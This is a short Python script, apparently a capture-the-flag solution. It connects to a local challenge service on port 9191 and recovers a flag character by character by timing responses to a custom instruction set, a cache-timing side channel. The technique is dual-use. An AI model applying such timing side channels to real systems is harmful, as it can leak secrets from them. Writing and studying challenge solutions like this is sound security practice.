import socket


def issue_cmd(sock, cmd):
    sock.sendall('{}\n'.format(cmd))
    return float(sock.recv(4096).strip())


def get_flag(sock):
    flag = []
    for addr in range(256):
        for guess in range(256):
            issue_cmd(sock, 'mvl a {}'.format(addr))
            issue_cmd(sock, 'ldi b a')
            issue_cmd(sock, 'clear')
            issue_cmd(sock, 'ldi c b')
            time = issue_cmd(sock, 'ld d {}'.format(guess))
            if time < 0.05:
                if guess == 0:
                    return ''.join(flag)
                print('found {}'.format(chr(guess)))
                flag.append(chr(guess))
                break


def main():
    sock = socket.socket()
    sock.connect(('localhost', 9191))
    print(get_flag(sock))


if __name__ == '__main__':
    main()
